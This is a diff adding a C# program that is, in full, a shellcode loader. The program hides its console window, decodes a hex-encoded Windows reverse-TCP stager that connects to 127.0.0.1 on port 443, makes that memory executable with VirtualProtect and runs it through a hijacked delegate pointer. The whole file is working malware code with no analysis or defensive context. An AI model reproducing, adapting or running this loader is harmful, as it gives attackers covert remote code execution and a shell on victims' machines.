@@ -1,0 +1,37 @@
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+namespace zirikatu
+{ class Program
+{ [DllImport("kernel32.dll", SetLastError = true)]
+static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+public delegate uint Ret1ArgDelegate(uint address);
+static uint PlaceHolder1(uint arg1) { return 0; }
+[DllImport("kernel32.dll")]
+static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+const int SW_HIDE = 0;
+unsafe static void Main(string[] args)
+{ var handle = GetConsoleWindow();
+ShowWindow(handle, SW_HIDE);
+string HexadezimalKatea ="fce88f0000006031d2648b523089e58b520c8b52148b722831ff0fb74a2631c0ac3c617c022c20c1cf0d01c74975ef52578b52108b423c01d08b407885c0744c01d08b58208b481801d35085c9743c31ff498b348b01d631c0c1cf0dac01c738e075f4037df83b7d2475e0588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe0585f5a8b12e980ffffff5d6833320000687773325f54684c77260789e8ffd0b89001000029c454506829806b00ffd56a0a687f00000168020001bb89e6505050504050405068ea0fdfe0ffd5976a1056576899a57461ffd585c0740cff4e0875ec68f0b5a256ffd56a006a0456576802d9c85fffd58b366a406800100000566a006858a453e5ffd593536a005653576802d9c85fffd501c329c675eec3";byte[] shellKodeahex = HexStringToByteArray(HexadezimalKatea);
+burutu(shellKodeahex); }
+public static byte[] HexStringToByteArray(String hexString)
+{ byte[] retval = new byte[hexString.Length / 2];
+for (int i = 0; i < hexString.Length; i += 2)
+retval [i / 2] = Convert.ToByte (hexString.Substring (i, 2), 16);
+return retval; }
+unsafe public static void burutu(byte[] asmBytes)
+{ fixed (byte* startAddress = &asmBytes[0])
+{ Type delType = typeof(Delegate);
+FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic | BindingFlags.Instance);
+Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);
+_methodPtr.SetValue(del, (IntPtr) startAddress);
+uint outOldProtection;
+VirtualProtect((IntPtr) startAddress, (uint) asmBytes.Length, 0x40, out outOldProtection);
+uint n = (uint)0x00000001;
+n = del(n);
+Console.WriteLine("{0:x}", n);
+Console.ReadKey();
+}}}}
